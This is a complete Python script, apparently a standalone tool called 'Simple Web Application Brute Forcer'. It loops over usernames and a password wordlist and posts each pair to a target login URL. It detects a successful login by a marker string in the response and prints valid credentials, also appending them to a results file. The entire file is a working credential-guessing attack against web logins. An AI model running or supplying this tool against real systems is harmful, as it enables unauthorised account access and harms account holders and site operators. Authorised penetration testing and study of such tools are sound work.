import requests
import sys
import argparse
from tqdm import tqdm

# Function to read usernames from a file
def read_usernames_from_file(file_path):
    try:
        with open(file_path, 'r') as file:
            return [line.strip() for line in file]
    except FileNotFoundError:
        sys.stdout.write(f"\n[!] Usernames file '{file_path}' not found!\n")
        sys.exit(1)

# Function for brute-forcing
def brute_force(target, usernames, password_file, needle):
    # Using a session for efficient HTTP connections
    session = requests.Session()
    
    # Loop through each username
    for username in usernames:
        with open(password_file, "r") as passwords_list:
            for password in tqdm(passwords_list, desc=f"Trying passwords for {username}"):
                password = password.strip("\n")
                
                # Display the current attempt
                sys.stdout.write(f"\r[X] Attempting {username}:{password}")
                sys.stdout.flush()

                try:
                    # Send the POST request
                    response = session.post(target, data={"username": username, "password": password})

                    # Check if the response contains the success needle
                    if needle in response.text:
                        sys.stdout.write(f"\n[>>>] Valid password '{password}' found for user '{username}'!\n")
                        with open("brute_force_results.txt", "a") as result_file:
                            result_file.write(f"Valid password '{password}' found for user '{username}'\n")
                        return  # Exit once a valid password is found

                except requests.exceptions.RequestException as e:
                    sys.stdout.write(f"\n[!] Error occurred: {e}\n")
                    break  # Exit on error to avoid false positives or excessive retries

        sys.stdout.write(f"\n[!] No password found for '{username}'!\n")

# Main function
if __name__ == "__main__":
    # Set up command-line arguments
    parser = argparse.ArgumentParser(description="Simple Web Application Brute Forcer")
    parser.add_argument("target", help="Target URL for the web application")
    parser.add_argument("--usernames", help="Comma-separated list of usernames to test")
    parser.add_argument("--usernames_file", help="File containing usernames to test")
    parser.add_argument("password_file", help="File containing passwords to try")
    parser.add_argument("--needle", required=True, help="Text indicating a successful login (e.g., 'Welcome back')")

    args = parser.parse_args()

    # Determine where to get the usernames from
    if args.usernames:
        usernames = args.usernames.split(',')
    elif args.usernames_file:
        usernames = read_usernames_from_file(args.usernames_file)
    else:
        sys.stdout.write("[!] Please provide either a list of usernames or a file containing usernames.\n")
        sys.exit(1)

    # Run the brute-force function
    brute_force(args.target, usernames, args.password_file, args.needle)
